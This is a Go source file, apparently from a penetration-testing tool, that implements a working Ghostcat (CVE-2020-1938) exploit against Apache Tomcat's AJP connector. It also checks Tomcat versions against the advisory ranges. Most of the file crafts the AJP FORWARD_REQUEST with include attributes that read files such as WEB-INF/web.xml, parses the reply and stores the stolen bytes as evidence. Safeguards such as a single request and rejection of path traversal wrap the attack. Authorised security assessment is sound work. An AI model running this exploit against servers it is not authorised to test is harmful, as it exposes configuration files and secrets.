package tomcat

import (
	"bytes"
	"context"
	"crypto/sha256"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"io"
	"net"
	"os"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
	"time"
)

const (
	ajpForwardRequest    = 0x02
	ajpSendBodyChunk     = 0x03
	ajpSendHeaders       = 0x04
	ajpEndResponse       = 0x05
	ajpGetBodyChunk      = 0x06
	ajpRequestAttribute  = 0x0a
	ajpAttributesDone    = 0xff
	maxAJPFrameBytes     = 64 * 1024
	maxAJPResponseFrames = 4096
	maxGhostcatBodyBytes = 1024 * 1024
)

var (
	tomcatVersionPattern = regexp.MustCompile(`^(\d+)\.(\d+)\.(\d+)(?:[.-]?M(\d+))?`)
	evidenceIDPattern    = regexp.MustCompile(`[^A-Za-z0-9._-]+`)
)

// GhostcatConfig fixes every input to one AJP request. A caller must never
// retry this operation automatically.
type GhostcatConfig struct {
	Host       string
	Port       int
	ServerName string
	ServerPort int
	IsSSL      bool
	File       string
	Timeout    time.Duration
	OutputDir  string
	EvidenceID string
}

// AssessGhostcatVersion always records CVE-2020-1938 applicability when a
// Tomcat version is available. The Apache advisory explicitly covers only the
// ranges below; old EOL branches remain unverified rather than being guessed.
func AssessGhostcatVersion(version string) GhostcatAssessment {
	result := GhostcatAssessment{
		Version:        version,
		Classification: Unverified,
		Interpretation: "no precise Tomcat version was available for CVE-2020-1938 range correlation",
	}
	match := tomcatVersionPattern.FindStringSubmatch(strings.TrimSpace(version))
	if len(match) == 0 {
		return result
	}
	major, _ := strconv.Atoi(match[1])
	minor, _ := strconv.Atoi(match[2])
	patch, _ := strconv.Atoi(match[3])
	result.Authoritative = true

	switch {
	case major == 7 && minor == 0:
		result.AffectedRange = "7.0.0 through 7.0.99"
		result.FirstFixed = "7.0.100"
		result.VersionMatched = patch <= 99
	case major == 8 && minor == 5:
		result.AffectedRange = "8.5.0 through 8.5.50"
		result.FirstFixed = "8.5.51"
		result.VersionMatched = patch <= 50
	case major == 9 && minor == 0:
		result.AffectedRange = "9.0.0.M1 through 9.0.30"
		result.FirstFixed = "9.0.31"
		result.VersionMatched = patch <= 30
	case major < 7 || (major == 8 && minor == 0):
		result.Authoritative = false
		result.Interpretation = "the observed EOL branch is not explicitly covered by the authoritative Apache CVE-2020-1938 range; AJP exposure and patch provenance remain unverified"
		return result
	default:
		result.Interpretation = "the observed version is outside the authoritative Apache CVE-2020-1938 affected ranges; AJP configuration and downstream patch provenance were not tested"
		return result
	}

	if result.VersionMatched {
		result.Classification = Potential
		result.Interpretation = "the observed version falls within an authoritative CVE-2020-1938 affected range; AJP enablement, reachability, shared-secret controls, and the file-read primitive remain separate prerequisites"
		return result
	}
	result.Interpretation = "the observed version is at or above the first fixed release for its branch; AJP configuration and downstream patch provenance were not tested"
	return result
}

// NormalizeGhostcatFile accepts exactly one web-application-relative resource.
// It rejects traversal (including encoded forms), URLs, path parameters,
// query strings, fragments, control characters, and paths that collapse to
// the web-application root.
func NormalizeGhostcatFile(value string) (string, error) {
	value = strings.TrimSpace(value)
	value = strings.TrimPrefix(value, "/")
	if value == "" {
		return "", fmt.Errorf("Ghostcat file cannot be empty")
	}
	if len(value) > 1024 {
		return "", fmt.Errorf("Ghostcat file cannot exceed 1024 bytes")
	}
	if strings.Contains(value, "\\") || strings.ContainsAny(value, "?#%;:") || strings.Contains(value, "://") {
		return "", fmt.Errorf("Ghostcat file must be a web-application-relative path")
	}
	for _, r := range value {
		if r < 0x20 || r == 0x7f {
			return "", fmt.Errorf("Ghostcat file contains a control character")
		}
	}
	segments := strings.Split(value, "/")
	for _, segment := range segments {
		if segment == "" || segment == "." || segment == ".." {
			return "", fmt.Errorf("Ghostcat file contains an empty, current-directory, or traversal segment")
		}
	}
	return strings.Join(segments, "/"), nil
}

// ReadGhostcatFile performs one TCP connection and one AJP13 FORWARD_REQUEST.
// It never retries and never returns the acquired body to its caller.
func ReadGhostcatFile(ctx context.Context, cfg GhostcatConfig) (result GhostcatResult) {
	result.Requested = true
	result.Classification = Unverified
	result.Host = strings.TrimSpace(cfg.Host)
	result.Port = cfg.Port
	result.RequestedFile = cfg.File
	result.StartedAt = time.Now()
	defer func() {
		result.FinishedAt = time.Now()
		result.Duration = result.FinishedAt.Sub(result.StartedAt)
	}()

	file, err := NormalizeGhostcatFile(cfg.File)
	if err != nil {
		result.Error = sanitizeText(err.Error(), 512)
		result.Interpretation = "the requested file was rejected locally before any AJP connection"
		return result
	}
	result.RequestedFile = file
	if err := ValidateAJPHost(result.Host); err != nil {
		result.Error = sanitizeText(err.Error(), 512)
		result.Interpretation = "the AJP host was rejected locally before any connection"
		return result
	}
	if cfg.Port < 1 || cfg.Port > 65535 {
		result.Error = "AJP port is outside 1-65535"
		result.Interpretation = "the AJP port was rejected locally before any connection"
		return result
	}
	if cfg.Timeout <= 0 {
		result.Error = "AJP timeout must be greater than zero"
		result.Interpretation = "the timeout was rejected locally before any connection"
		return result
	}
	if strings.TrimSpace(cfg.OutputDir) == "" {
		result.Error = "Ghostcat output directory is empty"
		result.Interpretation = "the restricted evidence destination was rejected before any connection"
		return result
	}
	if err := ensureRestrictedDirectory(cfg.OutputDir); err != nil {
		result.Error = sanitizeText("prepare restricted Ghostcat evidence: "+err.Error(), 512)
		result.Interpretation = "the restricted evidence destination was unsafe or unavailable; no AJP connection was made"
		return result
	}

	serverName := strings.TrimSpace(cfg.ServerName)
	if serverName == "" {
		serverName = result.Host
	}
	serverPort := cfg.ServerPort
	if serverPort < 1 || serverPort > 65535 {
		serverPort = 80
	}
	packet, err := buildGhostcatForwardRequest(result.Host, serverName, serverPort, cfg.IsSSL, file)
	if err != nil {
		result.Error = sanitizeText(err.Error(), 512)
		result.Interpretation = "the AJP request could not be constructed; no connection was made"
		return result
	}

	address := net.JoinHostPort(result.Host, strconv.Itoa(cfg.Port))
	result.Endpoint = "ajp13://" + address
	dialer := net.Dialer{Timeout: cfg.Timeout}
	conn, err := dialer.DialContext(ctx, "tcp", address)
	if err != nil {
		result.Executed = true
		result.Error = sanitizeText("connect AJP endpoint: "+err.Error(), 512)
		result.Interpretation = "the AJP endpoint did not complete a TCP connection; protocol exposure and CVE-2020-1938 remain unverified"
		return result
	}
	defer conn.Close()
	result.Executed = true
	if err := conn.SetDeadline(time.Now().Add(cfg.Timeout)); err != nil {
		result.Error = sanitizeText("set AJP deadline: "+err.Error(), 512)
		result.Interpretation = "the connection deadline could not be applied; no AJP request was sent"
		return result
	}

	result.RequestCount = 1
	if err := writeAll(conn, packet); err != nil {
		result.Error = sanitizeText("send AJP request: "+err.Error(), 512)
		result.Interpretation = "the single AJP request was not transmitted completely"
		return result
	}
	result.RequestSent = true

	parsed, body, err := readGhostcatResponse(conn)
	defer clear(body)
	result.ResponseMagic = parsed.magic
	result.ResponseStatusCode = parsed.statusCode
	result.ResponseStatus = sanitizeText(parsed.status, 128)
	result.ResponseContentType = sanitizeText(parsed.contentType, 256)
	result.ProtocolConfirmed = parsed.protocolConfirmed
	result.BodyTruncated = parsed.truncated
	if err != nil {
		result.Error = sanitizeText("read AJP response: "+err.Error(), 512)
		if parsed.protocolConfirmed {
			result.Interpretation = "AJP framing was confirmed, but the requested file was not acquired completely"
		} else {
			result.Interpretation = "the response did not provide enough valid AJP framing to confirm the protocol or file-read primitive"
		}
		return result
	}

	if len(body) == 0 {
		result.Interpretation = "AJP framing was confirmed, but the response contained no file bytes"
		return result
	}
	evidencePath, err := ghostcatEvidencePath(cfg, file)
	if err != nil {
		result.Error = sanitizeText(err.Error(), 512)
		result.Interpretation = "file bytes were received in memory, but a safe evidence filename could not be constructed; the bytes were discarded"
		return result
	}
	if err := writeRestrictedFile(evidencePath, body); err != nil {
		result.Error = sanitizeText("write restricted Ghostcat evidence: "+err.Error(), 512)
		result.Interpretation = "file bytes were received in memory, but could not be preserved in restricted evidence"
		return result
	}

	result.EvidencePath = evidencePath
	result.BodyBytes = len(body)
	result.BodyAcquired = true
	sum := sha256.Sum256(body)
	result.BodySHA256 = hex.EncodeToString(sum[:])
	result.FileReadConfirmed = confirmGhostcatFileRead(file, parsed.statusCode, body, parsed.truncated)
	if result.FileReadConfirmed {
		result.Classification = Confirmed
		result.Interpretation = "one AJP request returned the requested web-application resource and preserved it as restricted mode-0600 evidence"
	} else if !strings.EqualFold(file, "WEB-INF/web.xml") && plausibleGhostcatBody(parsed.statusCode, body, parsed.truncated) {
		result.Classification = Inferred
		result.Interpretation = "one AJP request returned and preserved body bytes for the selected include path, but the exact non-default file identity requires operator review of the restricted evidence"
	} else {
		result.Interpretation = "AJP returned body bytes, but the response did not meet the conservative confirmation criteria for the requested resource"
	}
	return result
}

type ghostcatResponse struct {
	magic             string
	statusCode        int
	status            string
	contentType       string
	protocolConfirmed bool
	truncated         bool
}

func buildGhostcatForwardRequest(remoteAddr, serverName string, serverPort int, isSSL bool, file string) ([]byte, error) {
	payload := []byte{ajpForwardRequest, 0x02} // FORWARD_REQUEST, GET
	var err error
	for _, value := range []string{"HTTP/1.1", "/asdf", remoteAddr} {
		payload, err = appendAJPString(payload, &value)
		if err != nil {
			return nil, err
		}
	}
	payload, err = appendAJPString(payload, nil) // remote_host
	if err != nil {
		return nil, err
	}
	payload, err = appendAJPString(payload, &serverName)
	if err != nil {
		return nil, err
	}
	portBytes := make([]byte, 2)
	binary.BigEndian.PutUint16(portBytes, uint16(serverPort))
	payload = append(payload, portBytes...)
	if isSSL {
		payload = append(payload, 0x01)
	} else {
		payload = append(payload, 0x00)
	}

	headers := []struct {
		code  uint16
		value string
	}{
		{0xA001, "text/html,*/*;q=0.8"},
		{0xA006, "close"},
		{0xA008, "0"},
		{0xA00B, serverName},
		{0xA00E, "JerrysRevenge/0.4.0"},
	}
	headerCount := make([]byte, 2)
	binary.BigEndian.PutUint16(headerCount, uint16(len(headers)))
	payload = append(payload, headerCount...)
	for _, header := range headers {
		code := make([]byte, 2)
		binary.BigEndian.PutUint16(code, header.code)
		payload = append(payload, code...)
		payload, err = appendAJPString(payload, &header.value)
		if err != nil {
			return nil, err
		}
	}

	attributes := [][2]string{
		{"javax.servlet.include.request_uri", "/"},
		{"javax.servlet.include.path_info", file},
		{"javax.servlet.include.servlet_path", "/"},
	}
	for _, attribute := range attributes {
		payload = append(payload, ajpRequestAttribute)
		name, value := attribute[0], attribute[1]
		payload, err = appendAJPString(payload, &name)
		if err != nil {
			return nil, err
		}
		payload, err = appendAJPString(payload, &value)
		if err != nil {
			return nil, err
		}
	}
	payload = append(payload, ajpAttributesDone)
	if len(payload) > 8186 {
		return nil, fmt.Errorf("AJP forward request exceeds 8186 bytes")
	}
	packet := make([]byte, 4, len(payload)+4)
	packet[0], packet[1] = 0x12, 0x34
	binary.BigEndian.PutUint16(packet[2:4], uint16(len(payload)))
	return append(packet, payload...), nil
}

func appendAJPString(destination []byte, value *string) ([]byte, error) {
	if value == nil {
		return append(destination, 0xff, 0xff), nil
	}
	data := []byte(*value)
	if len(data) > 65534 {
		return nil, fmt.Errorf("AJP string exceeds 65534 bytes")
	}
	length := make([]byte, 2)
	binary.BigEndian.PutUint16(length, uint16(len(data)))
	destination = append(destination, length...)
	destination = append(destination, data...)
	return append(destination, 0x00), nil
}

func readGhostcatResponse(reader io.Reader) (ghostcatResponse, []byte, error) {
	var result ghostcatResponse
	body := make([]byte, 0, 4096)
	sawHeaders := false
	for frame := 0; frame < maxAJPResponseFrames; frame++ {
		header := make([]byte, 4)
		if _, err := io.ReadFull(reader, header); err != nil {
			return result, body, err
		}
		if result.magic == "" {
			result.magic = hex.EncodeToString(header[:2])
		}
		if header[0] != 0x41 || header[1] != 0x42 {
			return result, body, fmt.Errorf("unexpected AJP response magic %x", header[:2])
		}
		frameLength := int(binary.BigEndian.Uint16(header[2:4]))
		if frameLength < 1 || frameLength > maxAJPFrameBytes {
			return result, body, fmt.Errorf("invalid AJP frame length %d", frameLength)
		}
		payload := make([]byte, frameLength)
		if _, err := io.ReadFull(reader, payload); err != nil {
			return result, body, err
		}
		switch payload[0] {
		case ajpSendHeaders:
			statusCode, status, contentType, err := parseAJPSendHeaders(payload)
			if err != nil {
				return result, body, err
			}
			result.statusCode = statusCode
			result.status = status
			result.contentType = contentType
			result.protocolConfirmed = true
			sawHeaders = true
		case ajpSendBodyChunk:
			if !sawHeaders {
				return result, body, fmt.Errorf("AJP body chunk arrived before response headers")
			}
			chunk, err := parseAJPBodyChunk(payload)
			if err != nil {
				return result, body, err
			}
			remaining := maxGhostcatBodyBytes - len(body)
			if remaining > 0 {
				if len(chunk) > remaining {
					body = append(body, chunk[:remaining]...)
					result.truncated = true
				} else {
					body = append(body, chunk...)
				}
			} else if len(chunk) > 0 {
				result.truncated = true
			}
		case ajpEndResponse:
			if !sawHeaders {
				return result, body, fmt.Errorf("AJP response ended before response headers")
			}
			return result, body, nil
		case ajpGetBodyChunk:
			return result, body, fmt.Errorf("unexpected AJP request for a client body")
		default:
			return result, body, fmt.Errorf("unsupported AJP response prefix 0x%02x", payload[0])
		}
	}
	return result, body, fmt.Errorf("AJP response exceeded %d frames", maxAJPResponseFrames)
}

func parseAJPSendHeaders(payload []byte) (int, string, string, error) {
	reader := bytes.NewReader(payload[1:])
	var statusCode uint16
	if err := binary.Read(reader, binary.BigEndian, &statusCode); err != nil {
		return 0, "", "", err
	}
	status, err := readAJPString(reader)
	if err != nil {
		return 0, "", "", err
	}
	var headerCount uint16
	if err := binary.Read(reader, binary.BigEndian, &headerCount); err != nil {
		return 0, "", "", err
	}
	if headerCount > 256 {
		return 0, "", "", fmt.Errorf("AJP response announced %d headers", headerCount)
	}
	contentType := ""
	for index := 0; index < int(headerCount); index++ {
		var nameCode uint16
		if err := binary.Read(reader, binary.BigEndian, &nameCode); err != nil {
			return 0, "", "", err
		}
		name := ""
		if nameCode&0xff00 == 0xa000 {
			name = ajpResponseHeaderName(nameCode)
		} else {
			customName, err := readAJPStringWithLength(reader, int(nameCode))
			if err != nil {
				return 0, "", "", err
			}
			name = customName
		}
		value, err := readAJPString(reader)
		if err != nil {
			return 0, "", "", err
		}
		if strings.EqualFold(name, "Content-Type") {
			contentType = value
		}
	}
	return int(statusCode), status, contentType, nil
}

func parseAJPBodyChunk(payload []byte) ([]byte, error) {
	if len(payload) < 4 {
		return nil, fmt.Errorf("short AJP body chunk")
	}
	length := int(binary.BigEndian.Uint16(payload[1:3]))
	if length > len(payload)-4 {
		return nil, fmt.Errorf("AJP body chunk length %d exceeds frame", length)
	}
	if payload[3+length] != 0x00 {
		return nil, fmt.Errorf("AJP body chunk is missing its terminator")
	}
	return payload[3 : 3+length], nil
}

func readAJPString(reader *bytes.Reader) (string, error) {
	var length int16
	if err := binary.Read(reader, binary.BigEndian, &length); err != nil {
		return "", err
	}
	if length == -1 {
		return "", nil
	}
	if length < 0 {
		return "", fmt.Errorf("invalid negative AJP string length")
	}
	return readAJPStringWithLength(reader, int(length))
}

func readAJPStringWithLength(reader *bytes.Reader, length int) (string, error) {
	if length < 0 || length > maxAJPFrameBytes {
		return "", fmt.Errorf("invalid AJP string length %d", length)
	}
	data := make([]byte, length)
	if _, err := io.ReadFull(reader, data); err != nil {
		return "", err
	}
	terminator, err := reader.ReadByte()
	if err != nil {
		return "", err
	}
	if terminator != 0x00 {
		return "", fmt.Errorf("AJP string is missing its terminator")
	}
	return string(data), nil
}

func ajpResponseHeaderName(code uint16) string {
	names := map[uint16]string{
		0xA001: "Content-Type",
		0xA002: "Content-Language",
		0xA003: "Content-Length",
		0xA004: "Date",
		0xA005: "Last-Modified",
		0xA006: "Location",
		0xA007: "Set-Cookie",
		0xA008: "Set-Cookie2",
		0xA009: "Servlet-Engine",
		0xA00A: "Status",
		0xA00B: "WWW-Authenticate",
	}
	return names[code]
}

// ValidateAJPHost rejects an endpoint override that contains a scheme, port,
// path, whitespace, or control character. It performs no name resolution.
func ValidateAJPHost(host string) error {
	if host == "" {
		return fmt.Errorf("AJP host cannot be empty")
	}
	if strings.Contains(host, "://") || strings.ContainsAny(host, "/?#") {
		return fmt.Errorf("AJP host must not contain a scheme, path, query, or fragment")
	}
	for _, r := range host {
		if r <= 0x20 || r == 0x7f {
			return fmt.Errorf("AJP host contains whitespace or a control character")
		}
	}
	if strings.HasPrefix(host, "[") && strings.HasSuffix(host, "]") {
		return fmt.Errorf("AJP IPv6 host must be supplied without brackets")
	}
	if strings.Contains(host, ":") && net.ParseIP(host) == nil {
		return fmt.Errorf("AJP host must not include a port")
	}
	return nil
}

// ValidateGhostcatOutputDir checks an existing output directory without
// creating it. A missing path is acceptable because active execution creates
// it with mode 0700 immediately before opening an AJP connection.
func ValidateGhostcatOutputDir(path string) error {
	path = strings.TrimSpace(path)
	if path == "" {
		return fmt.Errorf("Ghostcat output directory is empty")
	}
	info, err := os.Lstat(path)
	if os.IsNotExist(err) {
		return nil
	}
	if err != nil {
		return err
	}
	if info.Mode()&os.ModeSymlink != 0 || !info.IsDir() {
		return fmt.Errorf("%s is not a regular directory", path)
	}
	if info.Mode().Perm()&0o077 != 0 {
		return fmt.Errorf("%s must not be accessible by group or others", path)
	}
	return nil
}

// PrepareGhostcatOutputDir creates or revalidates the restricted directory.
// Callers should invoke it only after the execution gate, but before any
// target traffic, so evidence-storage failures are fail-closed.
func PrepareGhostcatOutputDir(path string) error {
	return ensureRestrictedDirectory(path)
}

func confirmGhostcatFileRead(file string, status int, body []byte, truncated bool) bool {
	if !strings.EqualFold(file, "WEB-INF/web.xml") || !plausibleGhostcatBody(status, body, truncated) {
		return false
	}
	lower := bytes.ToLower(body)
	return bytes.Contains(lower, []byte("<web-app")) ||
		(bytes.Contains(lower, []byte("<?xml")) && bytes.Contains(lower, []byte("servlet")))
}

func plausibleGhostcatBody(status int, body []byte, truncated bool) bool {
	if status != 200 || len(body) == 0 || truncated {
		return false
	}
	lower := bytes.ToLower(body)
	return !bytes.Contains(lower, []byte("<h1>http status")) &&
		!bytes.Contains(lower, []byte("exception report"))
}

func ensureRestrictedDirectory(path string) error {
	if err := ValidateGhostcatOutputDir(path); err != nil {
		return err
	}
	if _, err := os.Lstat(path); err == nil {
		return nil
	} else if !os.IsNotExist(err) {
		return err
	}
	if err := os.MkdirAll(path, 0o700); err != nil {
		return err
	}
	if err := os.Chmod(path, 0o700); err != nil {
		return err
	}
	return ValidateGhostcatOutputDir(path)
}

func ghostcatEvidencePath(cfg GhostcatConfig, file string) (string, error) {
	evidenceID := evidenceIDPattern.ReplaceAllString(strings.TrimSpace(cfg.EvidenceID), "-")
	evidenceID = strings.Trim(evidenceID, "-.")
	if evidenceID == "" {
		return "", fmt.Errorf("Ghostcat evidence ID is empty")
	}
	if len(evidenceID) > 96 {
		evidenceID = evidenceID[:96]
	}
	sum := sha256.Sum256([]byte(cfg.Host + "\x00" + strconv.Itoa(cfg.Port) + "\x00" + file))
	name := fmt.Sprintf("ghostcat-%s-%s.bin", evidenceID, hex.EncodeToString(sum[:6]))
	return filepath.Join(cfg.OutputDir, name), nil
}

func writeRestrictedFile(path string, body []byte) error {
	file, err := os.OpenFile(path, os.O_CREATE|os.O_EXCL|os.O_WRONLY, 0o600)
	if err != nil {
		return err
	}
	writeErr := writeAll(file, body)
	closeErr := file.Close()
	if writeErr != nil {
		return writeErr
	}
	return closeErr
}

func writeAll(writer io.Writer, data []byte) error {
	for len(data) > 0 {
		written, err := writer.Write(data)
		if err != nil {
			return err
		}
		if written == 0 {
			return io.ErrUnexpectedEOF
		}
		data = data[written:]
	}
	return nil
}
